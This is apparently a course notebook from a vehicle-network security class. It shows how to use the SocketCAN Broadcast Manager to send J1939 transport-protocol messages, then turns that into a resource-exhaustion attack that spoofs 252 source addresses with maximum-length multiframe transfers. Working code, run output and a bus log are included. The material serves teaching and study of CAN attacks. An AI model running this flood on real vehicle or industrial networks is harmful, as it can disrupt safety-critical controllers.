# %% [markdown]
# # <center> Using SocketCAN Broadcast Manager for Resource Exhaustion
# ## <center> SYSE 549: Secure Vehicle and Industrial Networking
# ## <center><img src="https://www.engr.colostate.edu/~jdaily/Systems-EN-CSU-1-C357.svg" width="400" />
# ### <center> Instructor: Dr. Jeremy Daily

# %% [markdown]
# ## Prerequisites
#
# ### SocketCAN Modules
# This notebook must be run on Linux with SocketCAN installed and running. If you can login to the command prompt, check for SocketCAN using `lsmod` as in the following:
# ```
# debian@beaglebone:~$ lsmod | grep can
# can_bcm                24576  1
# can_raw                20480  0
# vcan                   16384  0
# ```
# This shows three CAN based kernel modules: one for BroadCast Manager (BCM), one for single CAN frames (RAW), and a virtual CAN module (vcan).
#
# if one of the modules is missing, it can be added by using the modprobe command. For example:
# ```
# sudo modprobe can_bcm
# ```
#
# ### Network Interfaces
# The `ifconfig` command will show the connected interface devices. Look for can channels. For example:
#
# ```
# vcan1: flags=193<UP,RUNNING,NOARP>  mtu 72
#         unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
#         RX packets 108188617  bytes 865451566 (865.4 MB)
#         RX errors 0  dropped 0  overruns 0  frame 0
#         TX packets 108188617  bytes 865451566 (865.4 MB)
#         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
#
# ```
#
# Be sure the correct bitrate is selected using the following:
#
# ```
# ip -details -statistics link show can1
# ```
# Change the bitrate as follows:
# ```
# ip link set can1 down
# ip link set can1 up type can bitrate 250000
# ```
# ### Jupyter
#
# This notebook should be run with a jupyter server on the Linux machine. For example, if using the BeagleBone, start the server with the following command:
# ```
# jupyter notebook --ip 192.168.7.2 --no-browser &
# ```
# The `&` symbol runs the notebook server in the background.
#
# At the bottom of the terminal there are instructions to copy and paste the URL with a token into your browser.

# %% [markdown]
# # Using the Broadcast Manager (BCM)
# The broadcast manager in SocketCAN is helpful in setting up periodic messages. It takes away the timing and loop requirements for the programmer and relegates it to the kernel module. This enables a programmer to focus on the sensing and simulation parts of the program instead of the message timing.
#
# This example goes through transmitting a wheel speed message using the BCM.
#
# Details and Reference:
#
# https://github.com/nebaruzdin/can-doc/blob/master/can-bcm.txt

# %%
#Import the useful modules
import socket
import struct

# %%
# Open a socket and connect to it
sock = socket.socket(socket.PF_CAN, socket.SOCK_DGRAM, socket.CAN_BCM)

#Change this interface to match your desired connection
# Use can1 for the beaglebone on J1939
interface = "can1"

#Connect to the interface
sock.connect((interface,))

# To match the socketCAN BCM header data structure, the following struct format can be used:
# Interval seconds and useconds are platform dependent, others are 'uint32'. 
# Pad bytes are required at the end. This padding is not documented very well.
bcm_frame_format = "@3I4l2I0q"

# %% [markdown]
# ### Create the BCM Header
# The BCM header has the following elements:
# * opcode
# * message flag
# * count
# * timing intervals
# * unique CAN ID for task
# * number of CAN frames
#
# The number of CAN frames is the number of frames that are attached to the overall BCM data structure. The BCM method enables not just the simple periodic single can frame, but finite bursts of multi-frame messages. We'll start simple, then work towards a more complete example.
#
# Let's start with setting up a transmit BCM:
#
# #### Op-Codes
# From https://www.kernel.org/doc/Documentation/networking/can.txt, the following opcodes are defined:
#
# Transmit Operations (user space to broadcast manager):
#
#     TX_SETUP:   Create (cyclic) transmission task.
#
#     TX_DELETE:  Remove (cyclic) transmission task, requires only can_id.
#
#     TX_READ:    Read properties of (cyclic) transmission task for can_id.
#
#     TX_SEND:    Send one CAN frame.
#
#   Transmit Responses (broadcast manager to user space):
#
#     TX_STATUS:  Reply to TX_READ request (transmission task configuration).
#
#     TX_EXPIRED: Notification when counter finishes sending at initial interval
#       'ival1'. Requires the TX_COUNTEVT flag to be set at TX_SETUP.
#
#
#  #### Message Flags
#  From https://www.kernel.org/doc/Documentation/networking/can.txt, the following flags are defined:
#
#     SETTIMER:           Set the values of ival1, ival2 and count
#
#     STARTTIMER:         Start the timer with the actual values of ival1, ival2
#       and count. Starting the timer leads simultaneously to emit a CAN frame.
#
#     TX_COUNTEVT:        Create the message TX_EXPIRED when count expires
#
#     TX_ANNOUNCE:        A change of data by the process is emitted immediately.
#
#     TX_CP_CAN_ID:       Copies the can_id from the message header to each
#       subsequent frame in frames. This is intended as usage simplification. For
#       TX tasks the unique can_id from the message header may differ from the
#       can_id(s) stored for transmission in the subsequent struct can_frame(s).
#
#     TX_RESET_MULTI_IDX: Reset the index for the multiple frame transmission.
#
# Definitions in python are published here:
# https://github.com/caran/can4python/blob/4177bcf4368fd8484ec080e2d926cb999b14c6a5/can4python/constants.py#L72

# %%
# BCM flags
SETTIMER = 0x0001
STARTTIMER = 0x0002
TX_COUNTEVT = 0x0004
TX_ANNOUNCE = 0x0008
TX_CP_CAN_ID = 0x0010
RX_FILTER_ID = 0x0020
RX_CHECK_DLC = 0x0040
RX_NO_AUTOTIMER = 0x0080
RX_ANNOUNCE_RESUME = 0x0100
TX_RESET_MULTI_IDX = 0x0200
RX_RTR_FRAME = 0x0400
CAN_FD_FRAME = 0x0800

# %%
# To match the socketCAN CAN frame structure, the following struct format can be used:
can_frame_format = "=LB3x8s"

# %% [markdown]
# ## Send multiframe messages
# Let's send a message according to the J1939 transport protocol.
#
# The data is an arbitrary set of bytes that is limited to a length of 1785. We'll be using the broadcast announce message format.
#
# 1. Connection management
# 2. Data 1
# 3. Data 2
# 3. Data ...
# 4. Data n
#
# The PGN of the data is encoded as the last three bytes of the s65260 (0xFEEC). We'll be able to specify the source address, destination address, and priority. Let's build a function using BAM to send these messages out.

# %%
#create a function to send broadcast announce messges (BAM) using the J1939 fransport protocol
#Build the CAN Packets for a BAM message:
socket.CAN_EFF_FLAG = 0x80000000

def send_transport(pgn,data,sa_in,da_in=0xFF,priority=6):
    # make sure we don't have too much data to send. Max of J1939 is 255*7 = 1785
    data_to_send = data[:1785]
    
    #Sanitize source and destination address
    sa = sa_in & 0xFF
    da = da_in & 0xFF
    
    # See SAE J1939-21 for the definition of a broadcast announce message
    BAM = 32
    bytes_to_send = len(data_to_send)
    
    #Integer division to get the number of frames
    frames_to_send = bytes_to_send//7 
    
    #Check to see if there are any more data to partially fill the next frame
    if len(data_to_send)%7 > 0: 
        frames_to_send +=1
    
    #Build out the transport protocol - connection managment (TP.CM) CAN ID
    can_id = 0x00EC0000 | socket.CAN_EFF_FLAG
    can_id |= (priority & 0x07) << 26 # Set the priority 
    can_id |= (da & 0xFF) << 8 #Destination address
    can_id |= (sa  & 0xFF) #Source address
    #print("can_id = {:08X}".format(can_id))
    
    #Setup the broadcast manager
    opcode = socket.CAN_BCM_TX_SETUP
    flags = SETTIMER | STARTTIMER | TX_COUNTEVT # These flags set and start the timers for broadcast.
    count = frames_to_send + 1  #total number of messages. Include the connection management by adding 1
    ival1_tv_sec  = 0 # Seconds
    ival1_tv_usec = 20000 # Microseconds # the time between each message
    ival2_tv_sec  = 0 # Seconds
    ival2_tv_usec = 0 # Set this to zero to stop after the initial count.
    nframes = frames_to_send + 1   # Append a sequence of BAM messages
    
    #Pack the frame (i.e. make a glob of bytes) to make a valid BCM
    bcm_frame = struct.pack(bcm_frame_format,
                            opcode,
                            flags,
                            count,
                            ival1_tv_sec,
                            ival1_tv_usec,
                            ival2_tv_sec,
                            ival2_tv_usec,
                            can_id,
                            nframes)

    can_id |= 0x80000000# socket.CAN_EFF_FLAG #set the extended frame format flag for socketCAN
    
    # setup the frames to use in the BCM
    print(f"Sending {bytes_to_send} bytes in {frames_to_send} frames for pgn {pgn} to destination {da} from source {sa}.")
    
    # Make the TP.CM data field 
    pgn_bytes = struct.pack('<L',pgn)
    RESERVED = 255
    connection_data = struct.pack('<BHBBBBB',BAM,bytes_to_send,frames_to_send,RESERVED,pgn_bytes[0],pgn_bytes[1],pgn_bytes[2])

    can_dlc = len(connection_data)
    
    # Pack the information into 16 bytes for a CAN_RAW socket
    # This is the first frame in the sequence
    can_packet = struct.pack(can_frame_format, can_id, can_dlc, connection_data)

    # Append CAN_RAW frames to fill out the sequence
    # Data Transport ID, similarly constructed
    can_id_DT = 0x00EB0000 | socket.CAN_EFF_FLAG
    can_id_DT |= (priority & 0x07) << 26 # Set the priority 
    can_id_DT |= (da & 0xFF) << 8
    can_id_DT |= (sa & 0xFF)
    
    for i in range(frames_to_send):
        transport_data = struct.pack("B",i+1) + data_to_send[7*i:7*i+7]
        #Back fill the last frame with FFs
        if (i+1) == frames_to_send:
            while len(transport_data) < 8:
                transport_data += b'\xFF'
        can_packet += struct.pack(can_frame_format, can_id_DT, can_dlc, transport_data)

    # Put the frames on the network
    return (sock.send(bcm_frame+can_packet))

# %%
data = b'abcdefghijklmnopqrstuvwxyz'*2
send_transport(0xfeec,data,3,0xFF)
# Out:
# Sending 52 bytes in 8 frames for pgn 65260 to destination 255 from source 3.
# 184

# %%
data = b'abcdefghijklmnopqrstuvwxyz'*(1785//26+1)
for source in range(1,253):
    send_transport(0xfe00+source,data,source,0x00)
# Out:
# Sending 1785 bytes in 255 frames for pgn 65025 to destination 0 from source 1.
# Sending 1785 bytes in 255 frames for pgn 65026 to destination 0 from source 2.
# Sending 1785 bytes in 255 frames for pgn 65027 to destination 0 from source 3.
# Sending 1785 bytes in 255 frames for pgn 65028 to destination 0 from source 4.
# Sending 1785 bytes in 255 frames for pgn 65029 to destination 0 from source 5.
# Sending 1785 bytes in 255 frames for pgn 65030 to destination 0 from source 6.
# Sending 1785 bytes in 255 frames for pgn 65031 to destination 0 from source 7.
# Sending 1785 bytes in 255 frames for pgn 65032 to destination 0 from source 8.
# Sending 1785 bytes in 255 frames for pgn 65033 to destination 0 from source 9.
# Sending 1785 bytes in 255 frames for pgn 65034 to destination 0 from source 10.
# Sending 1785 bytes in 255 frames for pgn 65035 to destination 0 from source 11.
# Sending 1785 bytes in 255 frames for pgn 65036 to destination 0 from source 12.
# Sending 1785 bytes in 255 frames for pgn 65037 to destination 0 from source 13.
# Sending 1785 bytes in 255 frames for pgn 65038 to destination 0 from source 14.
# Sending 1785 bytes in 255 frames for pgn 65039 to destination 0 from source 15.
# Sending 1785 bytes in 255 frames for pgn 65040 to destination 0 from source 16.
# Sending 1785 bytes in 255 frames for pgn 65041 to destination 0 from source 17.
# Sending 1785 bytes in 255 frames for pgn 65042 to destination 0 from source 18.
# Sending 1785 bytes in 255 frames for pgn 65043 to destination 0 from source 19.
# Sending 1785 bytes in 255 frames for pgn 65044 to destination 0 from source 20.
# Sending 1785 bytes in 255 frames for pgn 65045 to destination 0 from source 21.
# Sending 1785 bytes in 255 frames for pgn 65046 to destination 0 from source 22.
# Sending 1785 bytes in 255 frames for pgn 65047 to destination 0 from source 23.
# Sending 1785 bytes in 255 frames for pgn 65048 to destination 0 from source 24.
# Sending 1785 bytes in 255 frames for pgn 65049 to destination 0 from source 25.
# Sending 1785 bytes in 255 frames for pgn 65050 to destination 0 from source 26.
# Sending 1785 bytes in 255 frames for pgn 65051 to destination 0 from source 27.
# Sending 1785 bytes in 255 frames for pgn 65052 to destination 0 from source 28.
# Sending 1785 bytes in 255 frames for pgn 65053 to destination 0 from source 29.
# Sending 1785 bytes in 255 frames for pgn 65054 to destination 0 from source 30.
# Sending 1785 bytes in 255 frames for pgn 65055 to destination 0 from source 31.
# Sending 1785 bytes in 255 frames for pgn 65056 to destination 0 from source 32.
# Sending 1785 bytes in 255 frames for pgn 65057 to destination 0 from source 33.
# Sending 1785 bytes in 255 frames for pgn 65058 to destination 0 from source 34.
# Sending 1785 bytes in 255 frames for pgn 65059 to destination 0 from source 35.
# Sending 1785 bytes in 255 frames for pgn 65060 to destination 0 from source 36.
# Sending 1785 bytes in 255 frames for pgn 65061 to destination 0 from source 37.
# Sending 1785 bytes in 255 frames for pgn 65062 to destination 0 from source 38.
# Sending 1785 bytes in 255 frames for pgn 65063 to destination 0 from source 39.
# Sending 1785 bytes in 255 frames for pgn 65064 to destination 0 from source 40.
# Sending 1785 bytes in 255 frames for pgn 65065 to destination 0 from source 41.
# Sending 1785 bytes in 255 frames for pgn 65066 to destination 0 from source 42.
# Sending 1785 bytes in 255 frames for pgn 65067 to destination 0 from source 43.
# Sending 1785 bytes in 255 frames for pgn 65068 to destination 0 from source 44.
# Sending 1785 bytes in 255 frames for pgn 65069 to destination 0 from source 45.
# Sending 1785 bytes in 255 frames for pgn 65070 to destination 0 from source 46.
# Sending 1785 bytes in 255 frames for pgn 65071 to destination 0 from source 47.
# Sending 1785 bytes in 255 frames for pgn 65072 to destination 0 from source 48.
# Sending 1785 bytes in 255 frames for pgn 65073 to destination 0 from source 49.
# Sending 1785 bytes in 255 frames for pgn 65074 to destination 0 from source 50.
# Sending 1785 bytes in 255 frames for pgn 65075 to destination 0 from source 51.
# Sending 1785 bytes in 255 frames for pgn 65076 to destination 0 from source 52.
# Sending 1785 bytes in 255 frames for pgn 65077 to destination 0 from source 53.
# Sending 1785 bytes in 255 frames for pgn 65078 to destination 0 from source 54.
# Sending 1785 bytes in 255 frames for pgn 65079 to destination 0 from source 55.
# Sending 1785 bytes in 255 frames for pgn 65080 to destination 0 from source 56.
# Sending 1785 bytes in 255 frames for pgn 65081 to destination 0 from source 57.
# Sending 1785 bytes in 255 frames for pgn 65082 to destination 0 from source 58.
# Sending 1785 bytes in 255 frames for pgn 65083 to destination 0 from source 59.
# Sending 1785 bytes in 255 frames for pgn 65084 to destination 0 from source 60.
# Sending 1785 bytes in 255 frames for pgn 65085 to destination 0 from source 61.
# Sending 1785 bytes in 255 frames for pgn 65086 to destination 0 from source 62.
# Sending 1785 bytes in 255 frames for pgn 65087 to destination 0 from source 63.
# Sending 1785 bytes in 255 frames for pgn 65088 to destination 0 from source 64.
# Sending 1785 bytes in 255 frames for pgn 65089 to destination 0 from source 65.
# Sending 1785 bytes in 255 frames for pgn 65090 to destination 0 from source 66.
# Sending 1785 bytes in 255 frames for pgn 65091 to destination 0 from source 67.
# Sending 1785 bytes in 255 frames for pgn 65092 to destination 0 from source 68.
# Sending 1785 bytes in 255 frames for pgn 65093 to destination 0 from source 69.
# Sending 1785 bytes in 255 frames for pgn 65094 to destination 0 from source 70.
# Sending 1785 bytes in 255 frames for pgn 65095 to destination 0 from source 71.
# Sending 1785 bytes in 255 frames for pgn 65096 to destination 0 from source 72.
# Sending 1785 bytes in 255 frames for pgn 65097 to destination 0 from source 73.
# Sending 1785 bytes in 255 frames for pgn 65098 to destination 0 from source 74.
# Sending 1785 bytes in 255 frames for pgn 65099 to destination 0 from source 75.
# Sending 1785 bytes in 255 frames for pgn 65100 to destination 0 from source 76.
# Sending 1785 bytes in 255 frames for pgn 65101 to destination 0 from source 77.
# Sending 1785 bytes in 255 frames for pgn 65102 to destination 0 from source 78.
# Sending 1785 bytes in 255 frames for pgn 65103 to destination 0 from source 79.
# Sending 1785 bytes in 255 frames for pgn 65104 to destination 0 from source 80.
# Sending 1785 bytes in 255 frames for pgn 65105 to destination 0 from source 81.
# Sending 1785 bytes in 255 frames for pgn 65106 to destination 0 from source 82.
# Sending 1785 bytes in 255 frames for pgn 65107 to destination 0 from source 83.
# Sending 1785 bytes in 255 frames for pgn 65108 to destination 0 from source 84.
# Sending 1785 bytes in 255 frames for pgn 65109 to destination 0 from source 85.
# Sending 1785 bytes in 255 frames for pgn 65110 to destination 0 from source 86.
# Sending 1785 bytes in 255 frames for pgn 65111 to destination 0 from source 87.
# Sending 1785 bytes in 255 frames for pgn 65112 to destination 0 from source 88.
# Sending 1785 bytes in 255 frames for pgn 65113 to destination 0 from source 89.
# Sending 1785 bytes in 255 frames for pgn 65114 to destination 0 from source 90.
# Sending 1785 bytes in 255 frames for pgn 65115 to destination 0 from source 91.
# Sending 1785 bytes in 255 frames for pgn 65116 to destination 0 from source 92.
# Sending 1785 bytes in 255 frames for pgn 65117 to destination 0 from source 93.
# Sending 1785 bytes in 255 frames for pgn 65118 to destination 0 from source 94.
# Sending 1785 bytes in 255 frames for pgn 65119 to destination 0 from source 95.
# Sending 1785 bytes in 255 frames for pgn 65120 to destination 0 from source 96.
# Sending 1785 bytes in 255 frames for pgn 65121 to destination 0 from source 97.
# Sending 1785 bytes in 255 frames for pgn 65122 to destination 0 from source 98.
# Sending 1785 bytes in 255 frames for pgn 65123 to destination 0 from source 99.
# Sending 1785 bytes in 255 frames for pgn 65124 to destination 0 from source 100.
# Sending 1785 bytes in 255 frames for pgn 65125 to destination 0 from source 101.
# Sending 1785 bytes in 255 frames for pgn 65126 to destination 0 from source 102.
# Sending 1785 bytes in 255 frames for pgn 65127 to destination 0 from source 103.
# Sending 1785 bytes in 255 frames for pgn 65128 to destination 0 from source 104.
# Sending 1785 bytes in 255 frames for pgn 65129 to destination 0 from source 105.
# Sending 1785 bytes in 255 frames for pgn 65130 to destination 0 from source 106.
# Sending 1785 bytes in 255 frames for pgn 65131 to destination 0 from source 107.
# Sending 1785 bytes in 255 frames for pgn 65132 to destination 0 from source 108.
# Sending 1785 bytes in 255 frames for pgn 65133 to destination 0 from source 109.
# Sending 1785 bytes in 255 frames for pgn 65134 to destination 0 from source 110.
# Sending 1785 bytes in 255 frames for pgn 65135 to destination 0 from source 111.
# Sending 1785 bytes in 255 frames for pgn 65136 to destination 0 from source 112.
# Sending 1785 bytes in 255 frames for pgn 65137 to destination 0 from source 113.
# Sending 1785 bytes in 255 frames for pgn 65138 to destination 0 from source 114.
# Sending 1785 bytes in 255 frames for pgn 65139 to destination 0 from source 115.
# Sending 1785 bytes in 255 frames for pgn 65140 to destination 0 from source 116.
# Sending 1785 bytes in 255 frames for pgn 65141 to destination 0 from source 117.
# Sending 1785 bytes in 255 frames for pgn 65142 to destination 0 from source 118.
# Sending 1785 bytes in 255 frames for pgn 65143 to destination 0 from source 119.
# Sending 1785 bytes in 255 frames for pgn 65144 to destination 0 from source 120.
# Sending 1785 bytes in 255 frames for pgn 65145 to destination 0 from source 121.
# Sending 1785 bytes in 255 frames for pgn 65146 to destination 0 from source 122.
# Sending 1785 bytes in 255 frames for pgn 65147 to destination 0 from source 123.
# Sending 1785 bytes in 255 frames for pgn 65148 to destination 0 from source 124.
# Sending 1785 bytes in 255 frames for pgn 65149 to destination 0 from source 125.
# Sending 1785 bytes in 255 frames for pgn 65150 to destination 0 from source 126.
# Sending 1785 bytes in 255 frames for pgn 65151 to destination 0 from source 127.
# Sending 1785 bytes in 255 frames for pgn 65152 to destination 0 from source 128.
# Sending 1785 bytes in 255 frames for pgn 65153 to destination 0 from source 129.
# Sending 1785 bytes in 255 frames for pgn 65154 to destination 0 from source 130.
# Sending 1785 bytes in 255 frames for pgn 65155 to destination 0 from source 131.
# Sending 1785 bytes in 255 frames for pgn 65156 to destination 0 from source 132.
# Sending 1785 bytes in 255 frames for pgn 65157 to destination 0 from source 133.
# Sending 1785 bytes in 255 frames for pgn 65158 to destination 0 from source 134.
# Sending 1785 bytes in 255 frames for pgn 65159 to destination 0 from source 135.
# Sending 1785 bytes in 255 frames for pgn 65160 to destination 0 from source 136.
# Sending 1785 bytes in 255 frames for pgn 65161 to destination 0 from source 137.
# Sending 1785 bytes in 255 frames for pgn 65162 to destination 0 from source 138.
# Sending 1785 bytes in 255 frames for pgn 65163 to destination 0 from source 139.
# Sending 1785 bytes in 255 frames for pgn 65164 to destination 0 from source 140.
# Sending 1785 bytes in 255 frames for pgn 65165 to destination 0 from source 141.
# Sending 1785 bytes in 255 frames for pgn 65166 to destination 0 from source 142.
# Sending 1785 bytes in 255 frames for pgn 65167 to destination 0 from source 143.
# Sending 1785 bytes in 255 frames for pgn 65168 to destination 0 from source 144.
# Sending 1785 bytes in 255 frames for pgn 65169 to destination 0 from source 145.
# Sending 1785 bytes in 255 frames for pgn 65170 to destination 0 from source 146.
# Sending 1785 bytes in 255 frames for pgn 65171 to destination 0 from source 147.
# Sending 1785 bytes in 255 frames for pgn 65172 to destination 0 from source 148.
# Sending 1785 bytes in 255 frames for pgn 65173 to destination 0 from source 149.
# Sending 1785 bytes in 255 frames for pgn 65174 to destination 0 from source 150.
# Sending 1785 bytes in 255 frames for pgn 65175 to destination 0 from source 151.
# Sending 1785 bytes in 255 frames for pgn 65176 to destination 0 from source 152.
# Sending 1785 bytes in 255 frames for pgn 65177 to destination 0 from source 153.
# Sending 1785 bytes in 255 frames for pgn 65178 to destination 0 from source 154.
# Sending 1785 bytes in 255 frames for pgn 65179 to destination 0 from source 155.
# Sending 1785 bytes in 255 frames for pgn 65180 to destination 0 from source 156.
# Sending 1785 bytes in 255 frames for pgn 65181 to destination 0 from source 157.
# Sending 1785 bytes in 255 frames for pgn 65182 to destination 0 from source 158.
# Sending 1785 bytes in 255 frames for pgn 65183 to destination 0 from source 159.
# Sending 1785 bytes in 255 frames for pgn 65184 to destination 0 from source 160.
# Sending 1785 bytes in 255 frames for pgn 65185 to destination 0 from source 161.
# Sending 1785 bytes in 255 frames for pgn 65186 to destination 0 from source 162.
# Sending 1785 bytes in 255 frames for pgn 65187 to destination 0 from source 163.
# Sending 1785 bytes in 255 frames for pgn 65188 to destination 0 from source 164.
# Sending 1785 bytes in 255 frames for pgn 65189 to destination 0 from source 165.
# Sending 1785 bytes in 255 frames for pgn 65190 to destination 0 from source 166.
# Sending 1785 bytes in 255 frames for pgn 65191 to destination 0 from source 167.
# Sending 1785 bytes in 255 frames for pgn 65192 to destination 0 from source 168.
# Sending 1785 bytes in 255 frames for pgn 65193 to destination 0 from source 169.
# Sending 1785 bytes in 255 frames for pgn 65194 to destination 0 from source 170.
# Sending 1785 bytes in 255 frames for pgn 65195 to destination 0 from source 171.
# Sending 1785 bytes in 255 frames for pgn 65196 to destination 0 from source 172.
# Sending 1785 bytes in 255 frames for pgn 65197 to destination 0 from source 173.
# Sending 1785 bytes in 255 frames for pgn 65198 to destination 0 from source 174.
# Sending 1785 bytes in 255 frames for pgn 65199 to destination 0 from source 175.
# Sending 1785 bytes in 255 frames for pgn 65200 to destination 0 from source 176.
# Sending 1785 bytes in 255 frames for pgn 65201 to destination 0 from source 177.
# Sending 1785 bytes in 255 frames for pgn 65202 to destination 0 from source 178.
# Sending 1785 bytes in 255 frames for pgn 65203 to destination 0 from source 179.
# Sending 1785 bytes in 255 frames for pgn 65204 to destination 0 from source 180.
# Sending 1785 bytes in 255 frames for pgn 65205 to destination 0 from source 181.
# Sending 1785 bytes in 255 frames for pgn 65206 to destination 0 from source 182.
# Sending 1785 bytes in 255 frames for pgn 65207 to destination 0 from source 183.
# Sending 1785 bytes in 255 frames for pgn 65208 to destination 0 from source 184.
# Sending 1785 bytes in 255 frames for pgn 65209 to destination 0 from source 185.
# Sending 1785 bytes in 255 frames for pgn 65210 to destination 0 from source 186.
# Sending 1785 bytes in 255 frames for pgn 65211 to destination 0 from source 187.
# Sending 1785 bytes in 255 frames for pgn 65212 to destination 0 from source 188.
# Sending 1785 bytes in 255 frames for pgn 65213 to destination 0 from source 189.
# Sending 1785 bytes in 255 frames for pgn 65214 to destination 0 from source 190.
# Sending 1785 bytes in 255 frames for pgn 65215 to destination 0 from source 191.
# Sending 1785 bytes in 255 frames for pgn 65216 to destination 0 from source 192.
# Sending 1785 bytes in 255 frames for pgn 65217 to destination 0 from source 193.
# Sending 1785 bytes in 255 frames for pgn 65218 to destination 0 from source 194.
# Sending 1785 bytes in 255 frames for pgn 65219 to destination 0 from source 195.
# Sending 1785 bytes in 255 frames for pgn 65220 to destination 0 from source 196.
# Sending 1785 bytes in 255 frames for pgn 65221 to destination 0 from source 197.
# Sending 1785 bytes in 255 frames for pgn 65222 to destination 0 from source 198.
# Sending 1785 bytes in 255 frames for pgn 65223 to destination 0 from source 199.
# Sending 1785 bytes in 255 frames for pgn 65224 to destination 0 from source 200.
# Sending 1785 bytes in 255 frames for pgn 65225 to destination 0 from source 201.
# Sending 1785 bytes in 255 frames for pgn 65226 to destination 0 from source 202.
# Sending 1785 bytes in 255 frames for pgn 65227 to destination 0 from source 203.
# Sending 1785 bytes in 255 frames for pgn 65228 to destination 0 from source 204.
# Sending 1785 bytes in 255 frames for pgn 65229 to destination 0 from source 205.
# Sending 1785 bytes in 255 frames for pgn 65230 to destination 0 from source 206.
# Sending 1785 bytes in 255 frames for pgn 65231 to destination 0 from source 207.
# Sending 1785 bytes in 255 frames for pgn 65232 to destination 0 from source 208.
# Sending 1785 bytes in 255 frames for pgn 65233 to destination 0 from source 209.
# Sending 1785 bytes in 255 frames for pgn 65234 to destination 0 from source 210.
# Sending 1785 bytes in 255 frames for pgn 65235 to destination 0 from source 211.
# Sending 1785 bytes in 255 frames for pgn 65236 to destination 0 from source 212.
# Sending 1785 bytes in 255 frames for pgn 65237 to destination 0 from source 213.
# Sending 1785 bytes in 255 frames for pgn 65238 to destination 0 from source 214.
# Sending 1785 bytes in 255 frames for pgn 65239 to destination 0 from source 215.
# Sending 1785 bytes in 255 frames for pgn 65240 to destination 0 from source 216.
# Sending 1785 bytes in 255 frames for pgn 65241 to destination 0 from source 217.
# Sending 1785 bytes in 255 frames for pgn 65242 to destination 0 from source 218.
# Sending 1785 bytes in 255 frames for pgn 65243 to destination 0 from source 219.
# Sending 1785 bytes in 255 frames for pgn 65244 to destination 0 from source 220.
# Sending 1785 bytes in 255 frames for pgn 65245 to destination 0 from source 221.
# Sending 1785 bytes in 255 frames for pgn 65246 to destination 0 from source 222.
# Sending 1785 bytes in 255 frames for pgn 65247 to destination 0 from source 223.
# Sending 1785 bytes in 255 frames for pgn 65248 to destination 0 from source 224.
# Sending 1785 bytes in 255 frames for pgn 65249 to destination 0 from source 225.
# Sending 1785 bytes in 255 frames for pgn 65250 to destination 0 from source 226.
# Sending 1785 bytes in 255 frames for pgn 65251 to destination 0 from source 227.
# Sending 1785 bytes in 255 frames for pgn 65252 to destination 0 from source 228.
# Sending 1785 bytes in 255 frames for pgn 65253 to destination 0 from source 229.
# Sending 1785 bytes in 255 frames for pgn 65254 to destination 0 from source 230.
# Sending 1785 bytes in 255 frames for pgn 65255 to destination 0 from source 231.
# Sending 1785 bytes in 255 frames for pgn 65256 to destination 0 from source 232.
# Sending 1785 bytes in 255 frames for pgn 65257 to destination 0 from source 233.
# Sending 1785 bytes in 255 frames for pgn 65258 to destination 0 from source 234.
# Sending 1785 bytes in 255 frames for pgn 65259 to destination 0 from source 235.
# Sending 1785 bytes in 255 frames for pgn 65260 to destination 0 from source 236.
# Sending 1785 bytes in 255 frames for pgn 65261 to destination 0 from source 237.
# Sending 1785 bytes in 255 frames for pgn 65262 to destination 0 from source 238.
# Sending 1785 bytes in 255 frames for pgn 65263 to destination 0 from source 239.
# Sending 1785 bytes in 255 frames for pgn 65264 to destination 0 from source 240.
# Sending 1785 bytes in 255 frames for pgn 65265 to destination 0 from source 241.
# Sending 1785 bytes in 255 frames for pgn 65266 to destination 0 from source 242.
# Sending 1785 bytes in 255 frames for pgn 65267 to destination 0 from source 243.
# Sending 1785 bytes in 255 frames for pgn 65268 to destination 0 from source 244.
# Sending 1785 bytes in 255 frames for pgn 65269 to destination 0 from source 245.
# Sending 1785 bytes in 255 frames for pgn 65270 to destination 0 from source 246.
# Sending 1785 bytes in 255 frames for pgn 65271 to destination 0 from source 247.
# Sending 1785 bytes in 255 frames for pgn 65272 to destination 0 from source 248.
# Sending 1785 bytes in 255 frames for pgn 65273 to destination 0 from source 249.
# Sending 1785 bytes in 255 frames for pgn 65274 to destination 0 from source 250.
# Sending 1785 bytes in 255 frames for pgn 65275 to destination 0 from source 251.
# Sending 1785 bytes in 255 frames for pgn 65276 to destination 0 from source 252.

# %% [markdown]
# ```
# (1682531948.803005) vcan1 18EC0001#20E806FDFF01FE00 #SA = 1
# (1682531948.804018) vcan1 18EC0002#20E806FDFF02FE00
# (1682531948.805083) vcan1 18EC0003#20E806FDFF03FE00
# (1682531948.807462) vcan1 18EC0004#20E806FDFF04FE00
# (1682531948.808500) vcan1 18EC0005#20E806FDFF05FE00
# (1682531948.809391) vcan1 18EC0006#20E806FDFF06FE00
# (1682531948.810063) vcan1 18EC0007#20E806FDFF07FE00
# (1682531948.810913) vcan1 18EC0008#20E806FDFF08FE00
# (1682531948.811426) vcan1 18EC0009#20E806FDFF09FE00
# (1682531948.812310) vcan1 18EC000A#20E806FDFF0AFE00
# (1682531948.812820) vcan1 18EC000B#20E806FDFF0BFE00
# (1682531948.813366) vcan1 18EC000C#20E806FDFF0CFE00
# (1682531948.814123) vcan1 18EC000D#20E806FDFF0DFE00
# (1682531948.814791) vcan1 18EC000E#20E806FDFF0EFE00
# (1682531948.815463) vcan1 18EC000F#20E806FDFF0FFE00
# (1682531948.816449) vcan1 18EC0010#20E806FDFF10FE00
# (1682531948.816982) vcan1 18EC0011#20E806FDFF11FE00
# (1682531948.817660) vcan1 18EC0012#20E806FDFF12FE00
# (1682531948.818329) vcan1 18EC0013#20E806FDFF13FE00
# (1682531948.819353) vcan1 18EC0014#20E806FDFF14FE00
# (1682531948.819826) vcan1 18EC0015#20E806FDFF15FE00
# (1682531948.820505) vcan1 18EC0016#20E806FDFF16FE00
# (1682531948.821245) vcan1 18EC0017#20E806FDFF17FE00
# (1682531948.821934) vcan1 18EC0018#20E806FDFF18FE00 #SA = 0x18
# (1682531948.823028) vcan1 18EB0001#0161626364656667 #First DT message takes place while CM messages are still working
# (1682531948.824034) vcan1 18EB0002#0161626364656667
# (1682531948.825099) vcan1 18EB0003#0161626364656667
# (1682531948.826188) vcan1 18EC0019#20E806FDFF19FE00
# (1682531948.826929) vcan1 18EC001A#20E806FDFF1AFE00
# (1682531948.827486) vcan1 18EB0004#0161626364656667
# (1682531948.827619) vcan1 18EC001B#20E806FDFF1BFE00
# (1682531948.828116) vcan1 18EC001C#20E806FDFF1CFE00
# (1682531948.828515) vcan1 18EB0005#0161626364656667
# (1682531948.828562) vcan1 18EC001D#20E806FDFF1DFE00
# (1682531948.829003) vcan1 18EC001E#20E806FDFF1EFE00
